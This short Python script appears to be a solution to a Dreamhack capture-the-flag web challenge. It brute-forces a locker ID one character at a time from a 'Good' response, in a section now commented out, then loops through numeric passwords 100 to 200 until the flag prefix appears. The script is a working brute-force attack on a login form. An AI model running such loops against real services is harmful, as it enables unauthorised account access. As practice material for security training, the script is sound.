import requests
text=[]
x=0

url="http://host1.dreamhack.games:16315/" 
# bruteforcing으로 사물함번호 구하기
# i = [0,1,2,3,4,5,6,7,8,9]
# for j in range(97,123):
#     i.append(chr(j))

# while True:
#     datas={
#         "locker_num": "".join(text)+str(i[x]),"password":"0"
#     }
#     print(datas)
#     res=requests.post(url,data=datas)
#     if "Good" in res.text:
#         print("Find",i[x])
#         text.append(i[x])
#         x=0
#         if len(text)==4:
#             print("ID=","".join(text))
#             break
#     else:
#         x+=1
for i in range(100,201):
    datas={
        "locker_num":"wcsn", "password":i
    }
    res=requests.post(url,data=datas)
    print(i)
    if "DH" in res.text:
        print("Find",i)
        break